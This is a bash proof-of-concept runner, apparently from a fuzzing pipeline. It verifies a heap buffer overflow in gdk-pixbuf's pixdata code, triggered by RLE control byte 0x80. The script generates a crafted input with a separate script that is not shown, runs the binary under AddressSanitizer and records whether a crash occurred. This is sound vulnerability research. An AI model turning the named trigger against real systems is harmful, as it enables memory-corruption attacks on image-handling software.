#!/bin/bash
# PoC runner for VULN-001: Heap Buffer Overflow via RLE Control Byte 0x80
# Vulnerability: gdk-pixbuf/gdk-pixbuf/gdk-pixdata.c, lines 463-483

set -o pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/gdk-pixbuf/gdk-pixbuf_gdk-pixbuf-pixdata_c"
BINARY="/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/bin/gdk-pixbuf-pixdata"
LOADERS_CACHE="/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/lib/gdk-pixbuf-2.0/2.10.0/loaders.cache"
INPUT="$POC_DIR/vuln_001.gdkp"
OUTPUT="$POC_DIR/vuln_001_out.pixdata"

echo "[*] Generating malicious GdkPixdata file..."
python3 "$POC_DIR/vuln_001_gen.py"

if [ ! -f "$INPUT" ]; then
    echo "ERROR: Failed to generate $INPUT"
    echo "ERROR" > "$POC_DIR/vuln_001_status.txt"
    exit 1
fi

echo "[*] Running binary with ASAN..."
ASAN_OPTIONS="abort_on_error=0:log_path=${POC_DIR}/asan_001.log:halt_on_error=0" \
  GDK_PIXBUF_MODULE_FILE="$LOADERS_CACHE" \
  "$BINARY" "$INPUT" "$OUTPUT" \
  > "$POC_DIR/vuln_001_result.txt" 2>&1 || true

echo "[*] Checking for crash indicators..."
CRASH=0

# Check combined output + any ASAN log files
for f in "$POC_DIR/vuln_001_result.txt" "$POC_DIR"/asan_001.log.*; do
    if [ -f "$f" ]; then
        if grep -qE "ERROR|heap-buffer-overflow|SEGV|runtime error|AddressSanitizer|stack-buffer-overflow|heap-use-after-free|abort|signal" "$f" 2>/dev/null; then
            CRASH=1
            echo "[!] Crash evidence found in: $f"
        fi
    fi
done

if [ "$CRASH" -eq 1 ]; then
    echo "VERIFIED_CRASH" > "$POC_DIR/vuln_001_status.txt"
    echo "[+] VERIFIED_CRASH: heap buffer overflow triggered by RLE control byte 0x80"
else
    echo "UNVERIFIED" > "$POC_DIR/vuln_001_status.txt"
    echo "[-] UNVERIFIED: no crash detected"
fi

echo ""
echo "=== Result output ==="
cat "$POC_DIR/vuln_001_result.txt"
echo ""
echo "=== ASAN logs ==="
cat "$POC_DIR/asan_001.log"* 2>/dev/null || echo "(no ASAN log files found)"
echo ""
echo "=== Status ==="
cat "$POC_DIR/vuln_001_status.txt"
